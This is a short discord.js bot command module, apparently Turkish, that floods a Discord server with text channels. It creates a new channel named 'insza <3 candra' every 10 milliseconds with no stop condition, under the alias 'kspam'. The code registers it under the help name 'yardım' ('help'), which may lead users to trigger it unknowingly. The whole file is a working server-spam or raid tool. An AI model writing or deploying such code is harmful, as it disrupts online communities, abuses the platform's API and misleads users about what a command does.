const Discord = require('discord.js');

exports.run = (client, msg, args) => {  
  setInterval(() => {
       msg.guild.channels.create("insza <3 candra", { type: "text" });

  
  }, 10);
};

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['kspam']
};

exports.help = {
  name: 'yardım',
  description: 'Sunucuda Boş Kanallar Açar.',
  usage: 's'
};